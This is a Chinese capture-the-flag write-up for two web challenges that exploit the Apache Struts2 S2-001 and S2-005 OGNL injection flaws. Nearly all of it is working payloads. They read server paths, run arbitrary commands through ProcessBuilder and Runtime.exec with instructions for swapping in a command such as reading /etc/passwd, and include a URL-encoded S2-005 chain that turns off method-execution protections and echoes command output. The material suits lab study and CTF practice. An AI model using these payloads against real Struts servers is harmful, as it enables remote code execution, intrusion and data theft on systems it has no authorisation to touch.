## web279
#S2-001
WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8

### 漏洞点测试

`%{1+1}` 执行结果

![](attachments/Pasted%20image%2020240329090741.png)

### 获取tomcat执行路径

`%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}`

结果：`tomcatBinDir{/usr/local/tomcat/webapps}`

### 获取Web路径

`%{ #req=@org.apache.struts2.ServletActionContext@getRequest(), #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(), #response.println(#req.getRealPath('/')), #response.flush(), #response.close() }`

结果：`/usr/local/tomcat/webapps/S2-001/`

### POC
`%{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(), #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e), #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"), #f.getWriter().println(new java.lang.String(#e)), #f.getWriter().flush(),#f.getWriter().close() }`
替换其中的whoami即可执行命令，若存在空格，则写作：`{"cat","/etc/passwd"}`形式

## web280
#S2-005
Struts 2.0.0 - Struts 2.1.8 .1
### POC
```
(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/EDI%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1

```
有回显的poc

```
?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023mycmd\u003d\'ifconfig\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))

```